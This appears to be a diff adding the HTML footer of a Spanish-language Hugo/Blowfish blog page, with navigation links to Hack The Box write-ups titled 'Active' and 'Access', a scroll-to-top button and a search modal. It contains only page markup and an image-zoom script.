+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/writeupps/htb-active/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;HTB - Active
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-07-26T00:00:00&#43;00:00">26 julio 2026</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/writeupps/htb-access/">
+              <span class="leading-6">
+                HTB - Access&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-08-14T00:00:00&#43;00:00">14 agosto 2026</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Ir arriba"
+    title="Ir arriba">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          Fluwhen
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Desarrollada con <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Buscar"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Cerrar (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
